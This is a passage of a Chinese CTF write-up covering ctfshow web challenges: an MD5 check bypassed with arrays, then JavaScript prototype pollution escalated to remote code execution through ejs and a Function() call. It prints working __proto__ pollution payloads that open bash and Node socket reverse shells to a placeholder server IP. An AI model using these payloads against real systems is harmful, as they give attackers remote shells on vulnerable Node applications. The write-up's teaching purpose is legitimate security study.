class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.Router();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.get(<span class="string">&#x27;/&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">  res.type(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.query.a;</span><br><span class="line">  <span class="keyword">var</span> b = req.query.b;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag))&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    res.render(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = router;</span><br></pre></td></tr></table></figure><p>和 PHP 一样，数组绕过即可</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?a[]=1&amp;b=1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674410689-1523edd4-f331-49f9-ada3-27953cd41a99.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619674410689-1523edd4-f331-49f9-ada3-27953cd41a99.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>发现这样更易于理解</p><p>payload: <code>a[x]=1&amp;b[x]=2</code></p><p>运行一下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">a=[<span class="number">1</span>]</span><br><span class="line">b=[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619676222748-afd5ac3c-95ff-4ea9-b7d7-5fc017ef7dff.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619676222748-afd5ac3c-95ff-4ea9-b7d7-5fc017ef7dff.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web338-原型链污染"><a href="#web338-原型链污染" class="headerlink" title="web338 原型链污染"></a>web338 原型链污染</h2><p>题目描述处蓝奏云下载源码</p><p><a href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619675230760-b6f83557-6f65-4002-a134-8d2c0eeca5bb.zip">📎web338.zip</a></p><p>先看看这篇文章了解一波什么是 JS 的原型链污染</p><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a></p><p>关键代码</p><p>utils/common.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>routes/login.js</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">....</span><br><span class="line">utils.copy(user,req.body);</span><br><span class="line">  <span class="keyword">if</span>(secert.ctfshow===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>也就是说，我们不用关心 <code>secert</code> 是否有 <code>ctfshow</code> 这个属性，因为当它找不到这个属性时，它会从它自己的原型里找。</p><p>这里的 <code>secert</code> 是一个数组，然后 <code>utils.copy(user,req.body);</code> 操作是 <code>user</code> 也是数组，也就是我们通过 <code>req.body</code> 即 POST 请求体传入参数，通过 <code>user</code> 污染数组的原型，那么 <code>secert</code> 数组找不到 <code>ctfshow</code> 属性时，会一直往原型找，直到在数组原型中发现 <code>ctfshow</code> 属性值为 <code>36dboy</code> 。那么 <code>if</code> 语句即判断成功，就会输出 flag 了。</p><p>payload</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;ctfshow&quot;</span>: <span class="string">&quot;36dboy&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619686041322-ea3afafd-c050-401e-ac62-92c906083202.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619686041322-ea3afafd-c050-401e-ac62-92c906083202.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>一般遇到这种整套代码，特别是带有 package.json 的，可以尝试 <a href="https://snyk.io/">snyk</a> ，</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619833506599-02525d9f-0a41-4ee3-90e2-62683c6164bf.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619833506599-02525d9f-0a41-4ee3-90e2-62683c6164bf.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>发现个 <code>ejs</code> 的 RCE</p><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>先污染参数</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836696555-62e2a481-996f-4ff0-a3c2-29a70383cd6b.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836696555-62e2a481-996f-4ff0-a3c2-29a70383cd6b.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>然后随便请求一下，触发 <code>render</code> 方法</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836723109-6bdc2f7e-4cec-4da9-84bc-cc1924fd1f03.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836723109-6bdc2f7e-4cec-4da9-84bc-cc1924fd1f03.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>成功反弹 shell</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836758279-1a6d1c18-afe3-4c6c-9721-cea981b25e6c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619836758279-1a6d1c18-afe3-4c6c-9721-cea981b25e6c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>不过 snyk 给出的 poc 用 <code>filename</code> 参数利用好像有点问题， 不太清楚为啥。。即</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;filename&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>顺便记录一下 node 项目本地启动方法，在项目文件运行下面命令即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm start</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619837473151-eca98d9e-765c-4eee-8161-edcc0328d706.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619837473151-eca98d9e-765c-4eee-8161-edcc0328d706.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>默认端口为 <code>3000</code></p><h2 id="web339-原型链污染"><a href="#web339-原型链污染" class="headerlink" title="web339 原型链污染 +"></a>web339 原型链污染 +</h2><span class='btn'><a class="button"  title='node/v10.19.0'><i class='fas fa-tag'></i>node/v10.19.0</a></span><p>题目描述处蓝奏云下载源码</p><p><a href="https://www.yuque.com/attachments/yuque/0/2021/zip/2789727/1619686504884-e7563cf5-365e-44d1-acff-1b95a5827a7b.zip">📎web339.zip</a></p><p>和 web338 有点相似，不过不同点是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">....</span><br><span class="line">utils.copy(user,req.body);</span><br><span class="line"><span class="keyword">if</span>(secert.ctfshow===flag)&#123;</span><br><span class="line">    res.end(flag);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p><code>flag</code> 是变量，具体值不知</p><p>然后还多了个 <code>api.js</code> ，主要关注这行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.render(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;);</span><br></pre></td></tr></table></figure><p>是不是和 web338 里的参考链接 PHITHON 师傅出的 Code-Breaking 2018 Thejs 如出一辙？即可以 RCE，因为这里可污染点存在的匿名函数调用</p><p><a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L165</a></p><p><a href="https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L225">https://github.com/lodash/lodash/blob/4.17.4-npm/template.js#L225</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619788917182-da9b75b5-e2e0-47ff-bc66-4eee3514dcd6.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619788917182-da9b75b5-e2e0-47ff-bc66-4eee3514dcd6.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>仿照题目中的代码，先写个小demo</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">user = &#123;&#125;</span><br><span class="line">body = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;query&quot;:&quot;return 2233&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="function"><span class="title">copy</span>(<span class="params">user, body</span>)</span></span><br><span class="line">&#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790130420-39ba77d6-b64a-4dd6-8061-1fdf69a019aa.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790130420-39ba77d6-b64a-4dd6-8061-1fdf69a019aa.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>为什么 <code>query</code> 的值是 <code>2233</code> 呢？也就是为啥会被调用了呢？</p><p>首先看看 <code>query</code> 值是如何被改变的，其实就是通过 web338 的原型链污染，即 JS 中所有的对象的原型都可以继承到 <code>Object</code>，然后终点是 <code>null</code> 对象</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790602513-1290e5ea-29bc-41f3-a91c-8b0d93bf0deb.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790602513-1290e5ea-29bc-41f3-a91c-8b0d93bf0deb.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>如 web338 中所说的，当在当前上下文找不到相应对象时，会遍历 <code>Object</code> 对象是否存在相应的属性。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790802183-0104e1c4-0ab1-4bd1-957c-ce38d1551dd8.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619790802183-0104e1c4-0ab1-4bd1-957c-ce38d1551dd8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>到这里就很清楚的知道了，为什么 <code>query</code> 的值是 <code>&quot;return 2233&quot;</code> ，因为在调用 <code>copy</code> 时，原型链被污染了。</p><p>至于 <code>&#123; query: Function(query)(query)&#125;</code> 为何为 <code>&#123; query: 2233 &#125;</code></p><p>JS 的函数实际上都是一个 <code>Function</code> 对象，它的参数为</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="built_in">Function</span> ([arg1[, arg2[, ...argN]],] functionBody)</span><br></pre></td></tr></table></figure><p>写个小demo</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619791459250-37753d01-6c88-4e63-85a7-26100dfe77db.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619791459250-37753d01-6c88-4e63-85a7-26100dfe77db.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>即 <code>Function</code> 对象传入构造函数里的前面参数是函数的形参，当然可以省略，最后的形参写函数体。</p><p>其实作用和 <code>eval</code> 有点类似，详细可以看</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function</a></p><p>至此，利用思路明确了，只要污染了 <code>query</code> 对象，就可以执行任意我们想执行的代码，比如反弹个 shell 再获取 flag ~</p><p>然后污染点和 web338 一致，在 <code>login.js</code> 里的 <code>utils.copy(user,req.body);</code> ，代码执行的触发点在 <code>api.js</code> 的 <code>res.render(&#39;api&#39;, &#123; query: Function(query)(query)&#125;);</code> 处。</p><p>payload ，这里用 nodejs 原生 socket，防止因系统运行环境问题 shell 弹不回来，这里服务器的监听端口为 <code>2233</code> ，然后如何是 windows 系统就把 <code>/bin/sh</code> 换成 <code>cmd.exe</code> 应该就可以了。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>: &#123;<span class="attr">&quot;query&quot;</span>: <span class="string">&quot;return (function()&#123;var net = require(&#x27;net&#x27;),cp = require(&#x27;child_process&#x27;),sh = cp.spawn(&#x27;/bin/sh&#x27;, []);var client = new net.Socket();client.connect(2233, &#x27;服务器IP&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>先本地试试，这里服务器监听端口为 <code>2233</code></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">copy</span>(<span class="params">object1, object2</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            copy(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">user = &#123;&#125;</span><br><span class="line">body = <span class="built_in">JSON</span>.parse(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;query&quot;: &quot;return (function()&#123;var net = require(\&#x27;net\&#x27;),cp = require(\&#x27;child_process\&#x27;),sh = cp.spawn(\&#x27;/bin/sh\&#x27;, []);var client = new net.Socket();client.connect(2233, \&#x27;服务器IP\&#x27;, function()&#123;client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);&#125;);return /a/;&#125;)();&quot;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="function"><span class="title">copy</span>(<span class="params">user, body</span>)</span></span><br><span class="line">&#123; <span class="attr">query</span>: <span class="built_in">Function</span>(query)(query)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793178120-2e6e58a4-b750-4c6b-a7de-8cf9a2f60b64.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793178120-2e6e58a4-b750-4c6b-a7de-8cf9a2f60b64.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793198542-377ce54f-3687-4a88-a687-11717244f36e.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793198542-377ce54f-3687-4a88-a687-11717244f36e.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>ok，没啥大问题。</p><p>先 POST 一下 <code>login</code> 接口，污染 <code>query</code> 对象</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793434141-8c892952-f7cf-461d-b4f4-b261365597f6.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619793434141-8c892952-f7cf-461d-b4f4-b261365597f6.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>然后直接 POST 一下 <code>api</code> 接口即可。</p><p>emm，发现不行，之后访问 <code>/login</code> 和 <code>/api</code> 接口都是 <code>404 找不到文件</code> ，shell 也反弹不回来。</p><p>试试别人的</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;__proto__&quot;</span>:&#123;<span class="attr">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/服务器IP/监听端口 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796525635-ef217393-2d02-4228-a2aa-1ce9e7876933.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796525635-ef217393-2d02-4228-a2aa-1ce9e7876933.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619796551640-9d0beceb-3b78-4a2e-b77f-19ea45c2cecd.png?x-oss-process=image/resize,w_1500" class="lazyload" 